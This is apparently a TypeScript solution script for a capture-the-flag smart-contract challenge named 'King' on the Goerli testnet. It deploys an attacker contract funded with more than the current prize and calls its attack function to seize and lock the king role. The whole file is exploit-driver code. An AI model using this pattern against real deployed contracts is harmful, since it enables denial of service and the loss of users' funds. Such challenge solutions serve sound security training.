import { ethers } from "ethers";
import * as fs from 'fs';
import { King__factory, KingAttacker__factory } from '../typechain-types';


// Task: break the game

const rpc = 'https://rpc.ankr.com/eth_goerli'
const privateKey = ''
const instanceAddress = ''

const main = async () =>  {
    let tx;
  
    const provider = new ethers.JsonRpcProvider(rpc);
    const signer = new ethers.Wallet(privateKey, provider);

    console.log("Hacking the contract...");

    const kingContract = King__factory.connect(instanceAddress, signer);
    const prize = await kingContract.prize();

    const metadata = JSON.parse(fs.readFileSync('./artifacts/contracts/attackers/KingAttacker.sol/KingAttacker.json').toString());
    const factory = new ethers.ContractFactory(metadata.abi, metadata.bytecode, signer);
    const contract = await factory.deploy({ value: prize + BigInt(1) });
    await contract.deploymentTransaction()?.wait();

    const attackerAddress = await contract.getAddress();
    const attacker = KingAttacker__factory.connect(attackerAddress, signer);

    tx = await attacker.attack(instanceAddress);
    await tx.wait();

    const king = await kingContract._king();

    console.log("Successfully hacked!");
    console.log("Deployed contract address:", attackerAddress);
    console.log("The king:", king);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});